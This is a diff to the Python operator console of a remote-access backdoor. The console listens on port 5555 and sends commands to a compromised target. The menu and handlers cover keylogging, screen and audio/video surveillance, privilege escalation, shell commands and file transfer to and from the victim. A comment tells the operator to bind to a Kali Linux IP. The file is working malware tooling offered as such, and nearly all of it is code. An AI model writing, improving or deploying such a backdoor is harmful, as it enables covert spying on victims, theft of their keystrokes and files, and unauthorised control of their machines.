@@ -64,44 +64,114 @@ def download_file(file_name):
 
 # Function for the main communication loop with the target
 def target_communication():
-    print("\n=== Enhanced Backdoor Server ===")
-    print("Available commands:")
-    print("Basic: whoami, dir, ipconfig, cd <path>")
-    print("Keylogger: start_keylog, stop_keylog, get_keylog")
-    print("Recording: screenshot, start_recording, stop_recording, list_recordings")
-    print("Privilege: check_privs, escalate, privesc_report")
-    print("Files: upload <file>, download <file>")
-    print("Control: quit, clear")
-    print("===============================\n")
+    print("BASIC COMMANDS:")
+    print("   whoami, dir, ipconfig, pwd, ps, net user")
+    print("   cd <path>              - Change directory")
+    print("")
+    print("KEYLOGGER COMMANDS:")
+    print("   start_keylog           - Start keylogger")
+    print("   stop_keylog            - Stop keylogger")
+    print("   get_keylog             - Retrieve logged keys")
+    print("")
+    print("[NOT WORKING] RECORDING COMMANDS:")
+    print("   screenshot             - Take screenshot")
+    print("   start_recording        - Start audio/video surveillance")
+    print("   stop_recording         - Stop surveillance")
+    print("   list_recordings        - List recorded files")
+    print("")
+    print("PRIVILEGE ESCALATION:")
+    print("   check_privs            - Check current privileges")
+    print("   escalate               - Attempt privilege escalation")
+    print("   privesc_report         - Generate privilege report")
+    print("")
+    print("FILE OPERATIONS:")
+    print("   upload <filename>      - Upload file to target")
+    print("   download <filename>    - Download file from target")
+    print("")
+    print(f"Connected to target: {ip[0]}:{ip[1]}")
     
     while True:
         # Prompt the user for a command to send to the target.
         command = input('* Shell~%s: ' % str(ip))
+        
+        # Handle empty commands
+        if not command:
+            continue
+            
+        # Handle help command locally
+        if command == 'help':
+            target_communication()
+            break
+            
         # Send the user's command to the target using the reliable_send function.
         reliable_send(command)
-        if command == 'quit':
-            # If the user enters 'quit', exit the loop and close the connection.
-            break
-        elif command == 'clear':
-            # If the user enters 'clear', clear the terminal screen.
-            os.system('clear')
-        elif command[:3] == 'cd ':
-            # If the user enters 'cd', change the current directory on the target (not implemented).
-            pass
-        elif command[:8] == 'download':
+        
+        if command.startswith('cd '):
+            # Handle directory change
+            result = reliable_recv()
+            print(result)
+        elif command.startswith('download '):
             # If the user enters 'download', initiate the download of a file from the target.
-            download_file(command[9:])
-        elif command[:6] == 'upload':
+            filename = command[9:].strip()
+            download_file(filename)
+        elif command.startswith('upload '):
             # If the user enters 'upload', initiate the upload of a file to the target.
-            upload_file(command[7:])
+            filename = command[7:].strip()
+            if filename and os.path.exists(filename):
+                upload_file(filename)
+                result = reliable_recv()
+                print(result)
+            elif not filename:
+                print("Please specify a filename to upload")
+            else:
+                print(f"File not found: {filename}")
+        elif command in ['start_keylog', 'stop_keylog', 'get_keylog']:
+            # Handle keylogger commands
+            result = reliable_recv()
+            if command == 'start_keylog':
+                print(f"Keylogger: {result}")
+            elif command == 'stop_keylog':
+                print(f"Keylogger: {result}")
+            elif command == 'get_keylog':
+                print(f"Keylog Data:\n{'-'*40}")
+                print(result)
+                print("-"*40)
+        elif command in ['screenshot', 'start_recording', 'stop_recording', 'list_recordings']:
+            # Handle recording commands
+            result = reliable_recv()
+            if command == 'screenshot':
+                print(f"Screenshot: {result}")
+            elif command == 'start_recording':
+                print(f"Recording: {result}")
+            elif command == 'stop_recording':
+                print(f"Recording: {result}")
+            elif command == 'list_recordings':
+                print(f"Recordings:\n{result}")
+        elif command in ['check_privs', 'escalate', 'privesc_report']:
+            # Handle privilege escalation commands
+            result = reliable_recv()
+            if command == 'check_privs':
+                print(f"Privileges: {result}")
+            elif command == 'escalate':
+                print(f"Escalation Result:\n{'-'*40}")
+                print(result)
+                print("-"*40)
+            elif command == 'privesc_report':
+                print(f"Privilege Report:\n{'-'*40}")
+                print(result)
+                print("-"*40)
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
-            print(result)
+            print(f"Output:\n{result}")
+
 
 
 # Create a socket for the server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Allow socket reuse to prevent "Address already in use" error
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 # Bind the socket to listen on all interfaces and port 5555
 # CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
